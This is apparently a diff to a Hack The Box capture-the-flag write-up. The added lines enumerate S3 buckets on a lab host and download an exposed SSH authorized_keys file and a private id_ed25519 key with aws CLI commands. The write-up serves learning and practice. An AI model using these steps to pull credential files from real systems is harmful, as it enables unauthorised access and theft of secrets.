@@ -525,6 +525,19 @@ Then:
 aws --endpoint-url http://10.129.41.13:54321 s3 ls
 ```
 
+### Output
+
+```bash
+┌──(mensi㉿kali)-[~/Desktop]
+└─$ aws --endpoint-url http://10.129.41.13:54321 s3 ls
+2025-09-11 08:06:52 internal
+2025-09-11 08:06:52 randomfacts
+
+┌──(mensi㉿kali)-[~/Desktop]
+└─$
+
+```
+
 Buckets discovered:
 
 - internal
@@ -532,18 +545,22 @@ Buckets discovered:
 
 ---
 
-## The “internal” Bucket
+## 8. The “internal” Bucket
 
 Inside we find:
 
 ```
 .ssh/authorized_keys
+.ssh/id_ed25519
 ```
+
+![Alt text](../assets/htb/facts/20.png)
 
 We download it:
 
 ```bash
-aws s3 cp s3://internal/.ssh/authorized_keys .
+aws --endpoint-url http://10.129.41.13:54321 s3 cp s3://internal/.ssh/authorized_keys .
+
 ```
 
 Content:
@@ -552,9 +569,11 @@ Content:
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFfgjpLS4XE0OvROzUd8rw/pm0V+UJk1X3kDoy/9eNpt
 ```
 
----
-
 Then we discover the real prize:
+
+```bash
+aws --endpoint-url http://10.129.41.13:54321 s3 cp s3://internal/.ssh/id_ed25519 .
+```
 
 ```
 id_ed25519 (PRIVATE KEY)
